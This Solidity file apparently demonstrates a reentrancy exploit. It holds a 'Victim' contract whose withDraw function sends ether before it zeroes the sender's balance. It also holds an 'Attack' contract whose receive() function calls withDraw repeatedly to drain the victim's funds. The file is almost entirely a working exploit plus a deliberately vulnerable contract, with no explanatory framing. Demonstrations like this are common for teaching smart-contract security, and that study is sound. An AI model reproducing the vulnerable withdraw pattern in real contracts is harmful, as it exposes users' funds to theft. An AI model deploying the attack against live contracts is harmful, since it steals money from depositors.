// SPDX-License-Identifier: MIT

pragma solidity ^0.8.20;

contract Victim {
    mapping(address => uint256) balances;

    /**
     * @dev Deposits ether to the contract and updates the balance of the sender.
     */
    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    /**
     * @dev Withdraws the balance of the sender and sets the balance to zero.
     * @notice Throws an error if the balance of the sender is zero.
     */
    function withDraw() external {
        uint256 bal = balances[msg.sender];
        require(bal > 0, "You do have Zero balance");
        (bool success, ) = msg.sender.call{value: bal}("");
        require(success, "Transaction Failed");
        balances[msg.sender] = 0;
    }

    /**
     * @dev Returns the balance of the contract.
     */
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

contract Attack {
    Victim victim;

    /**
     * @dev Initializes the victim contract.
     * @param _victim The address of the victim contract.
     */
    constructor(address _victim) {
        victim = Victim(_victim);
    }

    /**
     * @dev Receives ether and calls the withdraw function of the victim contract.
     */
    receive() external payable {
        if (address(victim).balance > 0) {
            victim.withDraw();
        }
    }

    /**
     * @dev Deposits ether to the victim contract and calls the withdraw function of the victim contract.
     */
    function attack() external payable {
        victim.deposit{value: msg.value}();
        victim.withDraw();
    }

    /**
     * @dev Returns the balance of the attack contract.
     */
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
